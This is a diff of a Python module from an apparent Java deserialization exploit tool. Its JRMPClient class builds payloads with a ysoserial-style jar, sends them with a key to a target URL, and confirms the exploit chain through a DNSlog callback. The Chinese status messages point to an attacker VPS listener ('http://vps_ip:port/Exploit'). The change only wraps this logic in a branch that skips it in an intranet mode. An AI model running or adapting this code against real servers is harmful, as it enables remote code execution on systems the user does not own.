@@ -23,32 +23,35 @@ class JRMPClient(object):
 
 
     def sendPayload(self,url,command,resKey,func,fp=JAR_FILE):
-        dnslog = func[0]
-        phpsessid = func[1]
-        checkUrl = "jrmp.{}".format(dnslog)
-
-        if not os.path.exists(fp):
-            raise Exception('jar file not found!')
-        checkUrlPopen = subprocess.Popen(['java', '-jar', fp, 'JRMPClient', checkUrl],       #popen
-                                    stdout=subprocess.PIPE)
-        commandPopen = subprocess.Popen(['java', '-jar', fp, 'JRMPClient', command],       #popen
-                                    stdout=subprocess.PIPE)
-
-        self.sendCommand(url,resKey,checkUrlPopen)
- 
-        status = self.sendCommand(url,resKey,commandPopen)
-
-        if(status==200):
-            print("[+]   ****JRMPClient模块   key: {} 已成功发送！  状态码:{}".format(str(resKey),str(status)))
+        if '内网环境' in func:
+            pass
         else:
-            print("[-]   ****JRMPClient模块   key: {} 发送异常！    状态码:{}".format(str(resKey),str(status)))
+            dnslog = func[0]
+            phpsessid = func[1]
+            checkUrl = "jrmp.{}".format(dnslog)
 
-        check = self.checkDnslogResult(phpsessid)
-        
-        if check:
-            print("[+]   ****目标环境是否存在此利用链(利用方式:http://vps_ip:port/Exploit): YES")
-        else:
-            print("[+]   ****目标环境是否存在此利用链: NO")
+            if not os.path.exists(fp):
+                raise Exception('jar file not found!')
+            checkUrlPopen = subprocess.Popen(['java', '-jar', fp, 'JRMPClient', checkUrl],       #popen
+                                        stdout=subprocess.PIPE)
+            commandPopen = subprocess.Popen(['java', '-jar', fp, 'JRMPClient', command],       #popen
+                                        stdout=subprocess.PIPE)
+
+            self.sendCommand(url,resKey,checkUrlPopen)
+    
+            status = self.sendCommand(url,resKey,commandPopen)
+
+            if(status==200):
+                print("[+]   ****JRMPClient模块   key: {} 已成功发送！  状态码:{}".format(str(resKey),str(status)))
+            else:
+                print("[-]   ****JRMPClient模块   key: {} 发送异常！    状态码:{}".format(str(resKey),str(status)))
+
+            check = self.checkDnslogResult(phpsessid)
+            
+            if check:
+                print("[+]   ****目标环境是否存在此利用链(利用方式:http://vps_ip:port/Exploit): YES")
+            else:
+                print("[+]   ****目标环境是否存在此利用链: NO")
 
 
     def sendCommand(self,url,resKey,popen):
